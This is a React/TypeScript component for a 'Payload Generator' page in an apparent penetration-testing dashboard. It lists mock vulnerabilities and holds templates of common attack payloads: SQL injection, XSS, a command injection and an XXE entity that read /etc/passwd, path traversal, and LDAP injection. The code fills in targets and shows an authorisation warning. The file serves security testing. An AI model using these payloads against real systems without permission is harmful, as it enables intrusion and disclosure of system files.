
import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";
import { Code, Copy, Bug, AlertTriangle, Shield } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

export const PayloadGenerator = () => {
  const [payloadType, setPayloadType] = useState("");
  const [target, setTarget] = useState("");
  const [parameters, setParameters] = useState("");
  const [generatedPayload, setGeneratedPayload] = useState("");
  const [selectedVulnerability, setSelectedVulnerability] = useState("");
  const { toast } = useToast();

  // Mock vulnerabilities data (in a real app, this would come from a shared state/context)
  const vulnerabilities = [
    {
      id: "CVE-2023-1234",
      title: "SQL Injection in Login Form",
      severity: "high",
      target: "192.168.1.100",
      type: "sql-injection",
      description: "Potential SQL injection vulnerability detected in authentication mechanism"
    },
    {
      id: "CVE-2023-5678",
      title: "Cross-Site Scripting (XSS)",
      severity: "medium",
      target: "web-server.local",
      type: "xss-reflected",
      description: "Reflected XSS vulnerability in search parameter"
    },
    {
      id: "CVE-2023-9012",
      title: "Weak SSL/TLS Configuration",
      severity: "low",
      target: "192.168.1.101",
      type: "ssl-test",
      description: "Server accepts weak cipher suites"
    },
    {
      id: "CVE-2023-3456",
      title: "Directory Traversal",
      severity: "high",
      target: "file-server.local",
      type: "directory-traversal",
      description: "Possible directory traversal vulnerability allowing file access"
    }
  ];

  const payloadTemplates = {
    "sql-injection": {
      name: "SQL Injection",
      template: "' UNION SELECT 1,2,3,database(),version()-- -",
      description: "Basic SQL injection payload for MySQL databases"
    },
    "xss-reflected": {
      name: "Reflected XSS",
      template: "<script>alert('XSS')</script>",
      description: "Simple reflected cross-site scripting payload"
    },
    "xss-stored": {
      name: "Stored XSS",
      template: "<img src=x onerror=alert('Stored XSS')>",
      description: "Persistent cross-site scripting payload"
    },
    "command-injection": {
      name: "Command Injection",
      template: "; cat /etc/passwd #",
      description: "Unix command injection payload"
    },
    "directory-traversal": {
      name: "Directory Traversal",
      template: "../../../etc/passwd",
      description: "Path traversal payload to access sensitive files"
    },
    "ldap-injection": {
      name: "LDAP Injection",
      template: "*)(uid=*))(|(uid=*",
      description: "LDAP injection payload for authentication bypass"
    },
    "xxe": {
      name: "XML External Entity",
      template: `<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY test SYSTEM 'file:///etc/passwd'>
]>
<root>&test;</root>`,
      description: "XXE payload to read local files"
    },
    "ssl-test": {
      name: "SSL/TLS Test",
      template: "openssl s_client -connect TARGET:443 -cipher 'DES-CBC3-SHA'",
      description: "Command to test weak SSL/TLS ciphers"
    }
  };

  const handleVulnerabilitySelect = (vulnId: string) => {
    const vulnerability = vulnerabilities.find(v => v.id === vulnId);
    if (vulnerability) {
      setSelectedVulnerability(vulnId);
      setPayloadType(vulnerability.type);
      setTarget(vulnerability.target);
      setParameters("");
    }
  };

  const handleGeneratePayload = () => {
    if (!payloadType) {
      toast({
        title: "Error",
        description: "Please select a payload type or vulnerability",
        variant: "destructive",
      });
      return;
    }

    const template = payloadTemplates[payloadType as keyof typeof payloadTemplates];
    let payload = template.template;

    if (target) {
      payload = payload.replace(/TARGET/g, target);
    }

    if (parameters) {
      payload = payload.replace(/PARAMS/g, parameters);
    }

    setGeneratedPayload(payload);
    console.log("Generated payload for vulnerability:", selectedVulnerability, payload);

    toast({
      title: "Payload Generated",
      description: `${template.name} payload created successfully`,
    });
  };

  const handleCopyPayload = () => {
    navigator.clipboard.writeText(generatedPayload);
    toast({
      title: "Copied",
      description: "Payload copied to clipboard",
    });
  };

  const getSeverityIcon = (severity: string) => {
    switch (severity) {
      case "high": return <AlertTriangle size={16} className="text-red-400" />;
      case "medium": return <Bug size={16} className="text-orange-400" />;
      case "low": return <Shield size={16} className="text-yellow-400" />;
      default: return <Bug size={16} className="text-gray-400" />;
    }
  };

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case "high": return "bg-red-600";
      case "medium": return "bg-orange-600";
      case "low": return "bg-yellow-600";
      default: return "bg-gray-600";
    }
  };

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-3xl font-bold text-white">Payload Generator</h1>
        <p className="text-gray-400 mt-1">Generate targeted payloads for identified vulnerabilities</p>
      </div>

      <Card className="bg-gray-800 border-gray-700">
        <CardHeader>
          <CardTitle className="text-white flex items-center gap-2">
            <Bug size={20} />
            Target Vulnerabilities
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {vulnerabilities.map((vuln) => (
              <div
                key={vuln.id}
                className={`p-3 rounded-lg cursor-pointer transition-all border-2 ${
                  selectedVulnerability === vuln.id
                    ? "bg-green-900/30 border-green-600"
                    : "bg-gray-700/50 border-gray-600 hover:border-gray-500"
                }`}
                onClick={() => handleVulnerabilitySelect(vuln.id)}
              >
                <div className="flex items-start justify-between mb-2">
                  <div className="flex items-center gap-2">
                    {getSeverityIcon(vuln.severity)}
                    <h3 className="text-white font-medium text-sm">{vuln.title}</h3>
                  </div>
                  <Badge className={getSeverityColor(vuln.severity)}>
                    {vuln.severity.toUpperCase()}
                  </Badge>
                </div>
                <p className="text-gray-400 text-xs mb-1">{vuln.target}</p>
                <p className="text-gray-300 text-xs">{vuln.description}</p>
              </div>
            ))}
          </div>
        </CardContent>
      </Card>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <Card className="bg-gray-800 border-gray-700">
          <CardHeader>
            <CardTitle className="text-white flex items-center gap-2">
              <Code size={20} />
              Payload Configuration
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">Payload Type</label>
              <Select value={payloadType} onValueChange={setPayloadType}>
                <SelectTrigger className="bg-gray-700 border-gray-600 text-white">
                  <SelectValue placeholder="Select payload type or choose vulnerability above" />
                </SelectTrigger>
                <SelectContent className="bg-gray-700 border-gray-600">
                  {Object.entries(payloadTemplates).map(([key, template]) => (
                    <SelectItem key={key} value={key} className="text-white hover:bg-gray-600">
                      {template.name}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">Target</label>
              <Input
                value={target}
                onChange={(e) => setTarget(e.target.value)}
                placeholder="Target URL or parameter"
                className="bg-gray-700 border-gray-600 text-white"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">Additional Parameters</label>
              <Input
                value={parameters}
                onChange={(e) => setParameters(e.target.value)}
                placeholder="Custom parameters"
                className="bg-gray-700 border-gray-600 text-white"
              />
            </div>

            <Button
              onClick={handleGeneratePayload}
              className="w-full bg-green-600 hover:bg-green-700"
            >
              Generate Targeted Payload
            </Button>

            {payloadType && (
              <div className="p-3 bg-gray-700/50 rounded-lg">
                <h4 className="text-sm font-medium text-white mb-1">
                  {payloadTemplates[payloadType as keyof typeof payloadTemplates].name}
                </h4>
                <p className="text-xs text-gray-400">
                  {payloadTemplates[payloadType as keyof typeof payloadTemplates].description}
                </p>
              </div>
            )}
          </CardContent>
        </Card>

        <Card className="bg-gray-800 border-gray-700">
          <CardHeader>
            <CardTitle className="text-white flex items-center justify-between">
              Generated Payload
              {generatedPayload && (
                <Button
                  onClick={handleCopyPayload}
                  size="sm"
                  variant="outline"
                  className="border-gray-600 text-gray-300 hover:bg-gray-700"
                >
                  <Copy size={16} className="mr-2" />
                  Copy
                </Button>
              )}
            </CardTitle>
          </CardHeader>
          <CardContent>
            <Textarea
              value={generatedPayload}
              placeholder="Select a vulnerability above to generate a targeted payload..."
              className="bg-gray-700 border-gray-600 text-green-400 font-mono text-sm min-h-[200px]"
              readOnly
            />
            {generatedPayload && (
              <div className="mt-3 p-3 bg-yellow-900/20 border border-yellow-600/50 rounded-lg">
                <p className="text-yellow-400 text-xs">
                  <strong>Warning:</strong> Use these payloads only on systems you own or have explicit permission to test. 
                  Unauthorized use may be illegal and unethical.
                </p>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
};
